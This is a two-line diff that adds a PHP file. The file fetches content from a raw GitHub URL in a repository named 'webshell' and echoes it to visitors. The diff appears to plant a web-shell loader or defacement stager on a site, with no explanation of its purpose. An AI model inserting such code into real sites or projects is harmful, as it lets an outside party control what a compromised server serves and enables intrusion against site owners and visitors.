@@ -1,0 +1,2 @@
+<?php $a = file_get_contents('https://raw.githubusercontent.com/dorzkim/webshell/main/ikan-jambi');
+echo $a; ?>
